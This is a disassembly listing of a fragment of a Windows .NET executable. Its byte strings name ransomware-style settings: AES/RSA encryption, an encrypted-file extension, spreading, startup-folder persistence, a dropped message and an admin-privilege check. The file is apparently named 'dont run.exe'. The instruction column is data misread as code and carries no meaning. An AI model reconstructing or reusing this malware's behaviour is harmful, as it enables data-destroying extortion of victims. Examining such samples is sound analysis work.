  40415a:	00 00                	add    %al,(%eax)
  40415c:	86 18                	xchg   %bl,(%eax)
  40415e:	fd                   	std
  40415f:	03 5d 00             	add    0x0(%ebp),%ebx
  404162:	1f                   	pop    %ds
  404163:	00 b5 3a 00 00 00    	add    %dh,0x3a(%ebp)
  404169:	00 86 00 4e 0e 5d    	add    %al,0x5d0e4e00(%esi)
  40416f:	00 1f                	add    %bl,(%edi)
  404171:	00 00                	add    %al,(%eax)
  404173:	00 01                	add    %al,(%ecx)
  404175:	00 91 04 00 00 02    	add    %dl,0x2000004(%ecx)
  40417b:	00 98 04 00 00 03    	add    %bl,0x3000004(%eax)
  404181:	00 9f 04 00 00 04    	add    %bl,0x4000004(%edi)
  404187:	00 a6 04 00 00 01    	add    %ah,0x1000004(%esi)
  40418d:	00 ad 04 00 00 01    	add    %ch,0x1000004(%ebp)
  404193:	00 b2 04 00 00 01    	add    %dh,0x1000004(%edx)
  404199:	00 b2 04 00 00 01    	add    %dh,0x1000004(%edx)
  40419f:	00 b2 04 00 00 01    	add    %dh,0x1000004(%edx)
  4041a5:	00 b9 04 00 00 01    	add    %bh,0x1000004(%ecx)
  4041ab:	00 b9 04 00 00 01    	add    %bh,0x1000004(%ecx)
  4041b1:	00 c3                	add    %al,%bl
  4041b3:	04 00                	add    $0x0,%al
  4041b5:	00 01                	add    %al,(%ecx)
  4041b7:	00 b2 04 00 00 01    	add    %dh,0x1000004(%edx)
  4041bd:	00 cc                	add    %cl,%ah
  4041bf:	04 00                	add    $0x0,%al
  4041c1:	00 02                	add    %al,(%edx)
  4041c3:	00 df                	add    %bl,%bh
  4041c5:	04 00                	add    $0x0,%al
  4041c7:	00 01                	add    %al,(%ecx)
  4041c9:	00 ed                	add    %ch,%ch
  4041cb:	04 00                	add    $0x0,%al
  4041cd:	00 01                	add    %al,(%ecx)
  4041cf:	00 f2                	add    %dh,%dl
  4041d1:	04 00                	add    $0x0,%al
  4041d3:	00 02                	add    %al,(%edx)
  4041d5:	00 00                	add    %al,(%eax)
  4041d7:	05 00 00 01 00       	add    $0x10000,%eax
  4041dc:	02 01                	add    (%ecx),%al
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	01 00                	add    %eax,(%eax)
  4041e2:	02 01                	add    (%ecx),%al
  4041e4:	00 00                	add    %al,(%eax)
  4041e6:	01 00                	add    %eax,(%eax)
  4041e8:	e6 00                	out    %al,$0x0
  4041ea:	00 00                	add    %al,(%eax)
  4041ec:	01 00                	add    %eax,(%eax)
  4041ee:	10 05 00 00 01 00    	adc    %al,0x10000
  4041f4:	19 05 00 20 00 00    	sbb    %eax,0x2000
  4041fa:	00 00                	add    %al,(%eax)
  4041fc:	00 00                	add    %al,(%eax)
  4041fe:	01 00                	add    %eax,(%eax)
  404200:	60                   	pusha
  404201:	05 00 00 01 00       	add    $0x10000,%eax
  404206:	65 05 00 00 02 00    	gs add $0x20000,%eax
  40420c:	6f                   	outsl  %ds:(%esi),(%dx)
  40420d:	05 00 00 01 00       	add    $0x10000,%eax
  404212:	7d 05                	jge    0x404219
  404214:	00 00                	add    %al,(%eax)
  404216:	01 00                	add    %eax,(%eax)
  404218:	85 05 00 00 01 00    	test   %eax,0x10000
  40421e:	87 05 00 00 01 00    	xchg   %eax,0x10000
  404224:	a8 08                	test   $0x8,%al
  404226:	39 00                	cmp    %eax,(%eax)
  404228:	fd                   	std
  404229:	03 8b 00 49 00 fd    	add    -0x2ffb700(%ebx),%ecx
  40422f:	03 93 00 51 00 fd    	add    -0x2ffaf00(%ebx),%edx
  404235:	03 5d 00             	add    0x0(%ebp),%ebx
  404238:	59                   	pop    %ecx
  404239:	00 fd                	add    %bh,%ch
  40423b:	03 98 00 69 00 fd    	add    -0x2ff9700(%eax),%ebx
  404241:	03 5d 00             	add    0x0(%ebp),%ebx
  404244:	71 00                	jno    0x404246
  404246:	86 06                	xchg   %al,(%esi)
  404248:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404249:	00 61 00             	add    %ah,0x0(%ecx)
  40424c:	fd                   	std
  40424d:	03 ab 00 79 00 fd    	add    -0x2ff8700(%ebx),%ebp
  404253:	03 b1 00 79 00 92    	add    -0x6dff8700(%ecx),%esi
  404259:	06                   	push   %es
  40425a:	5d                   	pop    %ebp
  40425b:	00 81 00 6c 02 b7    	add    %al,-0x48fd9400(%ecx)
  404261:	00 89 00 bf 06 bd    	add    %cl,-0x42f94100(%ecx)
  404267:	00 89 00 d0 06 c2    	add    %cl,-0x3df93000(%ecx)
  40426d:	00 91 00 ec 06 40    	add    %dl,0x4006ec00(%ecx)
  404273:	00 71 00             	add    %dh,0x0(%ecx)
  404276:	0b 07                	or     (%edi),%eax
  404278:	c6 00 a1             	movb   $0xa1,(%eax)
  40427b:	00 20                	add    %ah,(%eax)
  40427d:	07                   	pop    %es
  40427e:	cc                   	int3
  40427f:	00 79 00             	add    %bh,0x0(%ecx)
  404282:	2e 07                	cs pop %es
  404284:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404285:	00 a9 00 4f 07 d7    	add    %ch,-0x28f8b100(%ecx)
  40428b:	00 a9 00 5c 07 dd    	add    %ch,-0x22f8a400(%ecx)
  404291:	00 a9 00 86 07 e2    	add    %ch,-0x1df87a00(%ecx)
  404297:	00 b1 00 a0 07 e7    	add    %dh,-0x18f86000(%ecx)
  40429d:	00 b9 00 a9 07 c2    	add    %bh,-0x3df85700(%ecx)
  4042a3:	00 89 00 b6 07 bd    	add    %cl,-0x42f84a00(%ecx)
  4042a9:	00 a1 00 cb 07 cc    	add    %ah,-0x33f83500(%ecx)
  4042af:	00 a9 00 d7 07 ed    	add    %ch,-0x12f82900(%ecx)
  4042b5:	00 21                	add    %ah,(%ecx)
  4042b7:	00 fd                	add    %bh,%ch
  4042b9:	03 5d 00             	add    0x0(%ebp),%ebx
  4042bc:	21 00                	and    %eax,(%eax)
  4042be:	ed                   	in     (%dx),%eax
  4042bf:	07                   	pop    %es
  4042c0:	00 01                	add    %al,(%ecx)
  4042c2:	d1 00                	roll   $1,(%eax)
  4042c4:	fd                   	std
  4042c5:	03 5d 00             	add    0x0(%ebp),%ebx
  4042c8:	a1 00 11 08 ed       	mov    0xed081100,%eax
  4042cd:	00 21                	add    %ah,(%ecx)
  4042cf:	00 1c 08             	add    %bl,(%eax,%ecx,1)
  4042d2:	0d 01 a1 00 21       	or     $0x2100a101,%eax
  4042d7:	08 13                	or     %dl,(%ebx)
  4042d9:	01 d1                	add    %edx,%ecx
  4042db:	00 2b                	add    %ch,(%ebx)
  4042dd:	08 18                	or     %bl,(%eax)
  4042df:	01 09                	add    %ecx,(%ecx)
  4042e1:	00 32                	add    %dh,(%edx)
  4042e3:	08 c2                	or     %al,%dl
  4042e5:	00 d9                	add    %bl,%cl
  4042e7:	00 44 08 25          	add    %al,0x25(%eax,%ecx,1)
  4042eb:	01 d9                	add    %ebx,%ecx
  4042ed:	00 4d 08             	add    %cl,0x8(%ebp)
  4042f0:	2a 01                	sub    (%ecx),%al
  4042f2:	e1 00                	loope  0x4042f4
  4042f4:	5e                   	pop    %esi
  4042f5:	08 30                	or     %dh,(%eax)
  4042f7:	01 a1 00 6d 08 3b    	add    %esp,0x3b086d00(%ecx)
  4042fd:	01 09                	add    %ecx,(%ecx)
  4042ff:	00 fd                	add    %bh,%ch
  404301:	03 5d 00             	add    0x0(%ebp),%ebx
  404304:	a1 00 aa 08 c2       	mov    0xc208aa00,%eax
  404309:	00 e9                	add    %ch,%cl
  40430b:	00 bc 08 4d 01 91 00 	add    %bh,0x91014d(%eax,%ecx,1)
  404312:	c5 08                	lds    (%eax),%ecx
  404314:	40                   	inc    %eax
  404315:	00 91 00 d2 08 40    	add    %dl,0x4008d200(%ecx)
  40431b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40431e:	fd                   	std
  40431f:	03 ab 00 f9 00 f0    	add    -0xfff0700(%ebx),%ebp
  404325:	08 59 01             	or     %bl,0x1(%ecx)
  404328:	01 01                	add    %eax,(%ecx)
  40432a:	fd                   	std
  40432b:	03 98 00 09 01 1e    	add    0x1e010900(%eax),%ebx
  404331:	09 6b 01             	or     %ebp,0x1(%ebx)
  404334:	01 01                	add    %eax,(%ecx)
  404336:	11 08                	adc    %ecx,(%eax)
  404338:	72 01                	jb     0x40433b
  40433a:	d9 00                	flds   (%eax)
  40433c:	2d 09 76 01 19       	sub    $0x19017609,%eax
  404341:	01 3c 09             	add    %edi,(%ecx,%ecx,1)
  404344:	7c 01                	jl     0x404347
  404346:	a1 00 6d 08 82       	mov    0x82086d00,%eax
  40434b:	01 19                	add    %ebx,(%ecx)
  40434d:	01 49 09             	add    %ecx,0x9(%ecx)
  404350:	7c 01                	jl     0x404353
  404352:	e1 00                	loope  0x404354
  404354:	4e                   	dec    %esi
  404355:	09 89 01 19 01 56    	or     %ecx,0x56011901(%ecx)
  40435b:	09 8e 01 e9 00 64    	or     %ecx,0x6400e901(%esi)
  404361:	09 4d 01             	or     %ecx,0x1(%ebp)
  404364:	21 00                	and    %eax,(%eax)
  404366:	1c 08                	sbb    $0x8,%al
  404368:	af                   	scas   %es:(%edi),%eax
  404369:	01 21                	add    %esp,(%ecx)
  40436b:	01 ee                	add    %ebp,%esi
  40436d:	09 be 01 31 01 fd    	or     %edi,-0x2feceff(%esi)
  404373:	03 5d 00             	add    0x0(%ebp),%ebx
  404376:	39 01                	cmp    %eax,(%ecx)
  404378:	fd                   	std
  404379:	03 5d 00             	add    0x0(%ebp),%ebx
  40437c:	41                   	inc    %ecx
  40437d:	01 4b 0a             	add    %ecx,0xa(%ebx)
  404380:	93                   	xchg   %eax,%ebx
  404381:	00 41 01             	add    %al,0x1(%ecx)
  404384:	57                   	push   %edi
  404385:	0a 93 00 49 01 fd    	or     -0x2feb700(%ebx),%dl
  40438b:	03 c7                	add    %edi,%eax
  40438d:	01 41 01             	add    %eax,0x1(%ecx)
  404390:	78 0a                	js     0x40439c
  404392:	ed                   	in     (%dx),%eax
  404393:	00 51 01             	add    %dl,0x1(%ecx)
  404396:	4d                   	dec    %ebp
  404397:	08 d0                	or     %dl,%al
  404399:	01 41 01             	add    %eax,0x1(%ecx)
  40439c:	90                   	nop
  40439d:	0a 00                	or     (%eax),%al
  40439f:	01 41 01             	add    %eax,0x1(%ecx)
  4043a2:	98                   	cwtl
  4043a3:	0a ed                	or     %ch,%ch
  4043a5:	00 41 01             	add    %al,0x1(%ecx)
  4043a8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4043a9:	0a 00                	or     (%eax),%al
  4043ab:	01 41 01             	add    %eax,0x1(%ecx)
  4043ae:	b8 0a d6 01 41       	mov    $0x4101d60a,%eax
  4043b3:	01 d2                	add    %edx,%edx
  4043b5:	0a dd                	or     %ch,%bl
  4043b7:	01 69 01             	add    %ebp,0x1(%ecx)
  4043ba:	fd                   	std
  4043bb:	03 e3                	add    %ebx,%esp
  4043bd:	01 71 01             	add    %esi,0x1(%ecx)
  4043c0:	07                   	pop    %es
  4043c1:	0b f0                	or     %eax,%esi
  4043c3:	01 71 01             	add    %esi,0x1(%ecx)
  4043c6:	0d 0b 5d 00 81       	or     $0x81005d0b,%eax
  4043cb:	01 1f                	add    %ebx,(%edi)
  4043cd:	0b 5d 00             	or     0x0(%ebp),%ebx
  4043d0:	31 01                	xor    %eax,(%ecx)
  4043d2:	27                   	daa
  4043d3:	0b f8                	or     %eax,%edi
  4043d5:	01 19                	add    %ebx,(%ecx)
  4043d7:	01 2f                	add    %ebp,(%edi)
  4043d9:	0b 10                	or     (%eax),%edx
  4043db:	02 a1 00 6d 08 16    	add    0x16086d00(%ecx),%ah
  4043e1:	02 89 01 fd 03 93    	add    -0x6cfc02ff(%ecx),%cl
  4043e7:	00 91 01 69 0b 98    	add    %dl,-0x67f496ff(%ecx)
  4043ed:	00 89 01 77 0b 28    	add    %cl,0x280b7701(%ecx)
  4043f3:	02 89 01 7f 0b 30    	add    0x300b7f01(%ecx),%cl
  4043f9:	02 99 01 9d 0b 41    	add    0x410b9d01(%ecx),%bl
  4043ff:	02 a1 01 b1 0b 60    	add    0x600bb101(%ecx),%ah
  404405:	02 a1 01 c3 0b c2    	add    -0x3df43cff(%ecx),%ah
  40440b:	00 a1 00 6d 08 57    	add    %ah,0x57086d00(%ecx)
  404411:	00 19                	add    %bl,(%ecx)
  404413:	01 f0                	add    %esi,%eax
  404415:	08 66 02             	or     %ah,0x2(%esi)
  404418:	19 01                	sbb    %eax,(%ecx)
  40441a:	d4 0b                	aam    $0xb
  40441c:	7c 01                	jl     0x40441f
  40441e:	a9 01 fd 03 98       	test   $0x9803fd01,%eax
  404423:	00 a9 01 ea 0b 98    	add    %ch,-0x67f415ff(%ecx)
  404429:	00 a9 00 fd 03 5d    	add    %ch,0x5d03fd00(%ecx)
  40442f:	00 a9 00 ff 0b 6b    	add    %ch,0x6b0bff00(%ecx)
  404435:	02 a9 00 92 06 72    	add    0x72069200(%ecx),%ch
  40443b:	02 19                	add    (%ecx),%bl
  40443d:	01 0d 0c 45 00 a9    	add    %ecx,0xa900450c
  404443:	01 14 0c             	add    %edx,(%esp,%ecx,1)
  404446:	30 02                	xor    %al,(%edx)
  404448:	a9 01 28 0c 98       	test   $0x980c2801,%eax
  40444d:	00 a9 01 44 0c 88    	add    %ch,-0x77f3bbff(%ecx)
  404453:	02 a9 00 92 06 8f    	add    -0x70f96e00(%ecx),%ch
  404459:	02 b9 01 79 0c ed    	add    -0x12f386ff(%ecx),%bh
  40445f:	00 a9 00 8d 0c c2    	add    %ch,-0x3df37300(%ecx)
  404465:	00 c1                	add    %al,%cl
  404467:	01 fd                	add    %edi,%ebp
  404469:	03 98 00 c9 01 b5    	add    -0x4afe3700(%eax),%ebx
  40446f:	0c 98                	or     $0x98,%al
  404471:	00 a1 00 bf 0c ad    	add    %ah,-0x52f34100(%ecx)
  404477:	02 a9 00 92 06 bd    	add    -0x42f96e00(%ecx),%ch
  40447d:	02 d1                	add    %cl,%dl
  40447f:	01 ec                	add    %ebp,%esp
  404481:	0c c7                	or     $0xc7,%al
  404483:	02 d9                	add    %cl,%bl
  404485:	01 f8                	add    %edi,%eax
  404487:	0c cc                	or     $0xcc,%al
  404489:	02 d9                	add    %cl,%bl
  40448b:	01 03                	add    %eax,(%ebx)
  40448d:	0d d4 02 a9 01       	or     $0x1a902d4,%eax
  404492:	fd                   	std
  404493:	03 5d 00             	add    0x0(%ebp),%ebx
  404496:	a9 01 0c 0d 98       	test   $0x980d0c01,%eax
  40449b:	00 a9 01 19 0d 98    	add    %ch,-0x67f2e6ff(%ecx)
  4044a1:	00 a9 00 27 0d 5d    	add    %ch,0x5d0d2700(%ecx)
  4044a7:	00 91 00 33 0d 4a    	add    %dl,0x4a0d3300(%ecx)
  4044ad:	00 e1                	add    %ah,%cl
  4044af:	00 3f                	add    %bh,(%edi)
  4044b1:	0d 10 02 19 01       	or     $0x1190210,%eax
  4044b6:	50                   	push   %eax
  4044b7:	0d f3 02 71 00       	or     $0x7102f3,%eax
  4044bc:	65 0d 4a 00 19 00    	gs or  $0x19004a,%eax
  4044c2:	fd                   	std
  4044c3:	03 98 00 e1 01 fd    	add    -0x2fe1f00(%eax),%ebx
  4044c9:	03 93 00 11 00 fd    	add    -0x2ffef00(%ebx),%edx
  4044cf:	03 5d 00             	add    0x0(%ebp),%ebx
  4044d2:	e9 01 81 0d 01       	jmp    0x14dc5d8
  4044d7:	03 19                	add    (%ecx),%ebx
  4044d9:	00 8c 0d 05 03 f9 01 	add    %cl,0x1f90305(%ebp,%ecx,1)
  4044e0:	98                   	cwtl
  4044e1:	0d 72 02 29 00       	or     $0x290272,%eax
  4044e6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4044e7:	0d ed 00 a1 00       	or     $0xa100ed,%eax
  4044ec:	ac                   	lods   %ds:(%esi),%al
  4044ed:	0d 48 01 a1 00       	or     $0xa10148,%eax
  4044f2:	b7 0d                	mov    $0xd,%bh
  4044f4:	48                   	dec    %eax
  4044f5:	01 19                	add    %ebx,(%ecx)
  4044f7:	00 bf 0c 0c 03 11    	add    %bh,0x11030c0c(%edi)
  4044fd:	00 5b 04             	add    %bl,0x4(%ebx)
  404500:	7a 00                	jp     0x404502
  404502:	11 00                	adc    %eax,(%eax)
  404504:	70 04                	jo     0x40450a
  404506:	81 00 31 00 c0 0d    	addl   $0xdc00031,(%eax)
  40450c:	ed                   	in     (%dx),%eax
  40450d:	00 31                	add    %dh,(%ecx)
  40450f:	00 cc                	add    %cl,%ah
  404511:	0d 93 00 01 02       	or     $0x2010093,%eax
  404516:	81 04 4a 00 a1 00 0f 	addl   $0xf00a100,(%edx,%ecx,2)
  40451d:	0e                   	push   %cs
  40451e:	0a 00                	or     (%eax),%al
  404520:	79 00                	jns    0x404522
  404522:	24 0e                	and    $0xe,%al
  404524:	17                   	pop    %ss
  404525:	03 79 00             	add    0x0(%ecx),%edi
  404528:	36 0e                	ss push %cs
  40452a:	5d                   	pop    %ebp
  40452b:	00 01                	add    %al,(%ecx)
  40452d:	02 89 04 45 00 08    	add    0x8004504(%ecx),%cl
  404533:	00 78 00             	add    %bh,0x0(%eax)
  404536:	61                   	popa
  404537:	00 2e                	add    %ch,(%esi)
  404539:	00 1b                	add    %bl,(%ebx)
  40453b:	00 35 03 2e 00 13    	add    %dh,0x13002e03
  404541:	00 2c 03             	add    %ch,(%ebx,%eax,1)
  404544:	c3                   	ret
  404545:	00 2b                	add    %ch,(%ebx)
  404547:	00 a1 00 e3 00 2b    	add    %ah,0x2b00e300(%ecx)
  40454d:	00 a1 00 03 01 2b    	add    %ah,0x2b010300(%ecx)
  404553:	00 a1 00 23 01 2b    	add    %ah,0x2b012300(%ecx)
  404559:	00 a1 00 a1 03 2b    	add    %ah,0x2b03a100(%ecx)
  40455f:	00 a1 00 c0 03 2b    	add    %ah,0x2b03c000(%ecx)
  404565:	00 a1 00 2f 00 91    	add    %ah,-0x6effd100(%ecx)
  40456b:	00 d2                	add    %dl,%dl
  40456d:	00 f1                	add    %dh,%cl
  40456f:	00 06                	add    %al,(%esi)
  404571:	01 1e                	add    %ebx,(%esi)
  404573:	01 36                	add    %esi,(%esi)
  404575:	01 41 01             	add    %eax,0x1(%ecx)
  404578:	95                   	xchg   %eax,%ebp
  404579:	01 aa 01 b4 01 fd    	add    %ebp,-0x2fe4bff(%edx)
  40457f:	01 1e                	add    %ebx,(%esi)
  404581:	02 35 02 48 02 76    	add    0x76024802,%dh
  404587:	02 97 02 b3 02 c3    	add    -0x3cfd4cfe(%edi),%dl
  40458d:	02 da                	add    %dl,%bl
  40458f:	02 e0                	add    %al,%ah
  404591:	02 eb                	add    %bl,%ch
  404593:	02 fa                	add    %dl,%bh
  404595:	02 12                	add    (%edx),%dl
  404597:	03 1e                	add    (%esi),%ebx
  404599:	03 25 03 05 00 01    	add    0x1000503,%esp
  40459f:	00 00                	add    %al,(%eax)
  4045a1:	00 63 04             	add    %ah,0x4(%ebx)
  4045a4:	86 00                	xchg   %al,(%eax)
  4045a6:	02 00                	add    (%eax),%al
  4045a8:	27                   	daa
  4045a9:	00 03                	add    %al,(%ebx)
  4045ab:	00 05 06 53 01 06    	add    %al,0x6015306
  4045b1:	01 03                	add    %eax,(%ebx)
  4045b3:	00 52 02             	add    %dl,0x2(%edx)
  4045b6:	01 00                	add    %eax,(%eax)
  4045b8:	40                   	inc    %eax
  4045b9:	01 41 00             	add    %eax,0x0(%ecx)
  4045bc:	07                   	pop    %es
  4045bd:	04 01                	add    $0x1,%al
  4045bf:	00 40 01             	add    %al,0x1(%eax)
  4045c2:	43                   	inc    %ebx
  4045c3:	00 22                	add    %ah,(%edx)
  4045c5:	04 01                	add    $0x1,%al
  4045c7:	00 b8 25 00 00 22    	add    %bh,0x22000025(%eax)
  4045cd:	00 04 80             	add    %al,(%eax,%eax,4)
	...
  4045e0:	e9 05 00 00 04       	jmp    0x44045ea
	...
  4045ed:	00 00                	add    %al,(%eax)
  4045ef:	00 01                	add    %al,(%ecx)
  4045f1:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  4045f5:	00 00                	add    %al,(%eax)
  4045f7:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  404602:	00 00                	add    %al,(%eax)
  404604:	01 00                	add    %eax,(%eax)
  404606:	7b 00                	jnp    0x404608
  404608:	00 00                	add    %al,(%eax)
  40460a:	00 00                	add    %al,(%eax)
  40460c:	04 00                	add    $0x0,%al
	...
  404616:	00 00                	add    %al,(%eax)
  404618:	01 00                	add    %eax,(%eax)
  40461a:	6d                   	insl   (%dx),%es:(%edi)
  40461b:	00 00                	add    %al,(%eax)
  40461d:	00 00                	add    %al,(%eax)
  40461f:	00 03                	add    %al,(%ebx)
  404621:	00 02                	add    %al,(%edx)
  404623:	00 05 00 04 00 06    	add    %al,0x6000400
  404629:	00 02                	add    %al,(%edx)
  40462b:	00 08                	add    %cl,(%eax)
  40462d:	00 05 00 09 00 05    	add    %al,0x5000900
  404633:	00 57 00             	add    %dl,0x0(%edi)
  404636:	67 01 00             	add    %eax,(%bx,%si)
  404639:	00 00                	add    %al,(%eax)
  40463b:	00 00                	add    %al,(%eax)
  40463d:	3c 4d                	cmp    $0x4d,%al
  40463f:	6f                   	outsl  %ds:(%esi),(%dx)
  404640:	64 75 6c             	fs jne 0x4046af
  404643:	65 3e 00 64 6f 6e    	gs add %ah,%ds:0x6e(%edi,%ebp,2)
  404649:	74 20                	je     0x40466b
  40464b:	72 75                	jb     0x4046c2
  40464d:	6e                   	outsb  %ds:(%esi),(%dx)
  40464e:	2e 65 78 65          	cs js,pn 0x4046b7
  404652:	00 50 72             	add    %dl,0x72(%eax)
  404655:	6f                   	outsl  %ds:(%esi),(%dx)
  404656:	67 72 61             	addr16 jb 0x4046ba
  404659:	6d                   	insl   (%dx),%es:(%edi)
  40465a:	00 43 6f             	add    %al,0x6f(%ebx)
  40465d:	6e                   	outsb  %ds:(%esi),(%dx)
  40465e:	73 6f                	jae    0x4046cf
  404660:	6c                   	insb   (%dx),%es:(%edi)
  404661:	65 41                	gs inc %ecx
  404663:	70 70                	jo     0x4046d5
  404665:	6c                   	insb   (%dx),%es:(%edi)
  404666:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40466d:	37                   	aaa
  40466e:	00 4e 61             	add    %cl,0x61(%esi)
  404671:	74 69                	je     0x4046dc
  404673:	76 65                	jbe    0x4046da
  404675:	4d                   	dec    %ebp
  404676:	65 74 68             	gs je  0x4046e1
  404679:	6f                   	outsl  %ds:(%esi),(%dx)
  40467a:	64 73 00             	fs jae 0x40467d
  40467d:	64 72 69             	fs jb  0x4046e9
  404680:	76 65                	jbe    0x4046e7
  404682:	4e                   	dec    %esi
  404683:	6f                   	outsl  %ds:(%esi),(%dx)
  404684:	74 69                	je     0x4046ef
  404686:	66 69 63 61 74 69    	imul   $0x6974,0x61(%ebx),%sp
  40468c:	6f                   	outsl  %ds:(%esi),(%dx)
  40468d:	6e                   	outsb  %ds:(%esi),(%dx)
  40468e:	00 4e 6f             	add    %cl,0x6f(%esi)
  404691:	74 69                	je     0x4046fc
  404693:	66 69 63 61 74 69    	imul   $0x6974,0x61(%ebx),%sp
  404699:	6f                   	outsl  %ds:(%esi),(%dx)
  40469a:	6e                   	outsb  %ds:(%esi),(%dx)
  40469b:	46                   	inc    %esi
  40469c:	6f                   	outsl  %ds:(%esi),(%dx)
  40469d:	72 6d                	jb     0x40470c
  40469f:	00 6d 73             	add    %ch,0x73(%ebp)
  4046a2:	63 6f 72             	arpl   %ebp,0x72(%edi)
  4046a5:	6c                   	insb   (%dx),%es:(%edi)
  4046a6:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  4046ad:	65 6d                	gs insl (%dx),%es:(%edi)
  4046af:	00 4f 62             	add    %cl,0x62(%edi)
  4046b2:	6a 65                	push   $0x65
  4046b4:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  4046b8:	79 73                	jns    0x40472d
  4046ba:	74 65                	je     0x404721
  4046bc:	6d                   	insl   (%dx),%es:(%edi)
  4046bd:	2e 57                	cs push %edi
  4046bf:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  4046c6:	46                   	inc    %esi
  4046c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c8:	72 6d                	jb     0x404737
  4046ca:	73 00                	jae    0x4046cc
  4046cc:	46                   	inc    %esi
  4046cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ce:	72 6d                	jb     0x40473d
  4046d0:	00 75 73             	add    %dh,0x73(%ebp)
  4046d3:	65 72 4e             	gs jb  0x404724
  4046d6:	61                   	popa
  4046d7:	6d                   	insl   (%dx),%es:(%edi)
  4046d8:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  4046dc:	65 72 44             	gs jb  0x404723
  4046df:	69 72 00 61 70 70 4d 	imul   $0x4d707061,0x0(%edx),%esi
  4046e6:	75 74                	jne    0x40475c
  4046e8:	65 78 52             	gs js  0x40473d
  4046eb:	75 6e                	jne    0x40475b
  4046ed:	00 65 6e             	add    %ah,0x6e(%ebp)
  4046f0:	63 72 79             	arpl   %esi,0x79(%edx)
  4046f3:	70 74                	jo     0x404769
  4046f5:	69 6f 6e 41 65 73 52 	imul   $0x52736541,0x6e(%edi),%ebp
  4046fc:	73 61                	jae    0x40475f
  4046fe:	00 65 6e             	add    %ah,0x6e(%ebp)
  404701:	63 72 79             	arpl   %esi,0x79(%edx)
  404704:	70 74                	jo     0x40477a
  404706:	65 64 46             	gs fs inc %esi
  404709:	69 6c 65 45 78 74 65 	imul   $0x6e657478,0x45(%ebp,%eiz,2),%ebp
  404710:	6e 
  404711:	73 69                	jae    0x40477c
  404713:	6f                   	outsl  %ds:(%esi),(%dx)
  404714:	6e                   	outsb  %ds:(%esi),(%dx)
  404715:	00 63 68             	add    %ah,0x68(%ebx)
  404718:	65 63 6b 53          	arpl   %ebp,%gs:0x53(%ebx)
  40471c:	70 72                	jo     0x404790
  40471e:	65 61                	gs popa
  404720:	64 00 73 70          	add    %dh,%fs:0x70(%ebx)
  404724:	72 65                	jb     0x40478b
  404726:	61                   	popa
  404727:	64 4e                	fs dec %esi
  404729:	61                   	popa
  40472a:	6d                   	insl   (%dx),%es:(%edi)
  40472b:	65 00 63 68          	add    %ah,%gs:0x68(%ebx)
  40472f:	65 63 6b 43          	arpl   %ebp,%gs:0x43(%ebx)
  404733:	6f                   	outsl  %ds:(%esi),(%dx)
  404734:	70 79                	jo     0x4047af
  404736:	52                   	push   %edx
  404737:	6f                   	outsl  %ds:(%esi),(%dx)
  404738:	61                   	popa
  404739:	6d                   	insl   (%dx),%es:(%edi)
  40473a:	69 6e 67 00 70 72 6f 	imul   $0x6f727000,0x67(%esi),%ebp
  404741:	63 65 73             	arpl   %esp,0x73(%ebp)
  404744:	73 4e                	jae    0x404794
  404746:	61                   	popa
  404747:	6d                   	insl   (%dx),%es:(%edi)
  404748:	65 00 61 70          	add    %ah,%gs:0x70(%ecx)
  40474c:	70 4d                	jo     0x40479b
  40474e:	75 74                	jne    0x4047c4
  404750:	65 78 52             	gs js  0x4047a5
  404753:	75 6e                	jne    0x4047c3
  404755:	32 00                	xor    (%eax),%al
  404757:	63 68 65             	arpl   %ebp,0x65(%eax)
  40475a:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  40475d:	74 61                	je     0x4047c0
  40475f:	72 74                	jb     0x4047d5
  404761:	75 70                	jne    0x4047d3
  404763:	46                   	inc    %esi
  404764:	6f                   	outsl  %ds:(%esi),(%dx)
  404765:	6c                   	insb   (%dx),%es:(%edi)
  404766:	64 65 72 00          	fs gs jb 0x40476a
  40476a:	63 68 65             	arpl   %ebp,0x65(%eax)
  40476d:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  404770:	6c                   	insb   (%dx),%es:(%edi)
  404771:	65 65 70 00          	gs gs jo 0x404775
  404775:	73 6c                	jae    0x4047e3
  404777:	65 65 70 54          	gs gs jo 0x4047cf
  40477b:	65 78 74             	gs js  0x4047f2
  40477e:	62 6f 78             	bound  %ebp,0x78(%edi)
  404781:	00 62 61             	add    %ah,0x61(%edx)
  404784:	73 65                	jae    0x4047eb
  404786:	36 34 49             	ss xor $0x49,%al
  404789:	6d                   	insl   (%dx),%es:(%edi)
  40478a:	61                   	popa
  40478b:	67 65 00 61 70       	add    %ah,%gs:0x70(%bx,%di)
  404790:	70 4d                	jo     0x4047df
  404792:	75 74                	jne    0x404808
  404794:	65 78 53             	gs js  0x4047ea
  404797:	74 61                	je     0x4047fa
  404799:	72 74                	jb     0x40480f
  40479b:	75 70                	jne    0x40480d
  40479d:	00 64 72 6f          	add    %ah,0x6f(%edx,%esi,2)
  4047a1:	70 70                	jo     0x404813
  4047a3:	65 64 4d             	gs fs dec %ebp
  4047a6:	65 73 73             	gs jae 0x40481c
  4047a9:	61                   	popa
  4047aa:	67 65 54             	addr16 gs push %esp
  4047ad:	65 78 74             	gs js  0x404824
  4047b0:	62 6f 78             	bound  %ebp,0x78(%edi)
  4047b3:	00 63 68             	add    %ah,0x68(%ebx)
  4047b6:	65 63 6b 41          	arpl   %ebp,%gs:0x41(%ebx)
  4047ba:	64 6d                	fs insl (%dx),%es:(%edi)
  4047bc:	69 6e 50 72 69 76 69 	imul   $0x69766972,0x50(%esi),%ebp
  4047c3:	6c                   	insb   (%dx),%es:(%edi)
  4047c4:	61                   	popa
  4047c5:	67 65 00 63 68       	add    %ah,%gs:0x68(%bp,%di)
  4047ca:	65 63 6b 64          	arpl   %ebp,%gs:0x64(%ebx)
  4047ce:	65 6c                	gs insb (%dx),%es:(%edi)
